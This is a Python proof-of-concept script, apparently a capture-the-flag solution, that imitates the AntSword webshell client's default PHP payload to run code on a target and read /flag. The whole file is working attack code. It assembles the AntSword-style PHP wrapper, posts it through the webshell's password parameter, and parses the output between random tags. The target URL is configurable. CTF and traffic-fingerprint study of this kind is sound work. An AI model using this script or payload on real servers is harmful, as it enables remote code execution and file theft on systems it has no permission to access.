#!/usr/bin/env python3
# web_antshell PoC：模拟「中国蚁剑」默认配置（PHP / default 编码器 / default 解码器）
# 连接站点（index.php）取回 /flag。蚁剑默认编码器把整段 PHP 明文放进连接密码参数，
# 头部 @ini_set(...) 前缀 + open_basedir 探测 + asoutput() 输出函数即其流量指纹。
# Usage: python exp.py [base_url]      (default http://127.0.0.1:8080)
import random
import re
import sys
import urllib.parse
import urllib.request

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8080"


def rand_tag():
    # 蚁剑 tag_s/tag_e：随机 hex，长度 5~12
    return "%x" % random.randrange(16 ** 5, 16 ** 13)


def build(code):
    # 组装逻辑对应蚁剑 source/core/php/index.js 的 complete()
    tag_s, tag_e = rand_tag(), rand_tag()
    payload = (
        '@ini_set("display_errors", "0");@set_time_limit(0);'
        'if(!function_exists("get_magic_quotes_gpc"))'
        '{function get_magic_quotes_gpc(){return 0;}};'
        '$opdir=@ini_get("open_basedir");if($opdir){};'
        'function asenc($out){return $out;};'
        f'function asoutput(){{$output=ob_get_contents();ob_end_clean();'
        f'echo "{tag_s}";echo @asenc($output);echo "{tag_e}";}};'
        f'ob_start();try{{{code};}}'
        f'catch(Exception $e){{echo "ERROR://".$e->getMessage();}};'
        'asoutput();die();'
    )
    return payload, tag_s, tag_e


def main():
    payload, tag_s, tag_e = build('echo @file_get_contents("/flag");')
    req = urllib.request.Request(
        BASE + "/",
        data=urllib.parse.urlencode({"HCTF": payload}).encode(),
        # 蚁剑 UA 为随机浏览器 UA（random-fake-useragent），本题不校验 UA
        headers={"User-Agent": "Mozilla/5.0"},
    )
    body = urllib.request.urlopen(req, timeout=10).read().decode("utf-8", "replace")

    m = re.search(re.escape(tag_s) + r"(.*?)" + re.escape(tag_e), body, re.S)
    if not m:
        sys.exit("no antSword-style response found - wrong challenge, or payload failed?")
    print(m.group(1).strip())


if __name__ == "__main__":
    main()
